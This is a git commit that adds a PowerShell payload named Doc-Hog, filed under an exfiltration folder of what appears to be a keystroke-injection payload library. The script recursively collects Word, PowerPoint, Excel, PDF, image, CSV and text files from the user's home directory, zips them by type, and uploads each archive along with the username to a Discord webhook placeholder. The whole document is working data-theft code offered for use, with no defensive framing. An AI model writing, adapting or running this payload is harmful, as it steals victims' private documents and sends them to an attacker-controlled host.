177c0efaf485a7aea0d04447d047bcb6eaa182b2
Gavin Kramer <75549184+atomiczsec@users.noreply.github.com>
2023-07-13 15:37:33 -0400

    Add files via upload

---
+++ payloads/library/exfiltration/Doc-Hog/d.ps1
@@ -0,0 +1,51 @@
+﻿function Doc-Hog {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+
+    $hookurl = 'DISCORD-WEBHOOK'
+
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
+}
+
+$Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse
+
+$types = @{
+    "*.docx" = "Word";
+    "*.doc" = "Word";
+    "*.pptx" = "PowerPoint";
+    "*.xlsx" = "Excel";
+    "*.pdf" = "PDF";
+    "*.jpeg" = "JPEG";
+    "*.png" = "PNG";
+    "*.jpg" = "JPEG";
+    "*.csv" = "CSV";
+    "*.txt" = "Text";
+}
+
+foreach ($type in $types.Keys) {
+    $filteredFiles = $Files | Where-Object {$_.Name -like $type}
+
+    if ($filteredFiles) {
+        $zipFile = "$env:TEMP\$($types[$type]).zip"
+
+        $filteredFiles | Compress-Archive -DestinationPath $zipFile
+
+        Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
+    }
+}
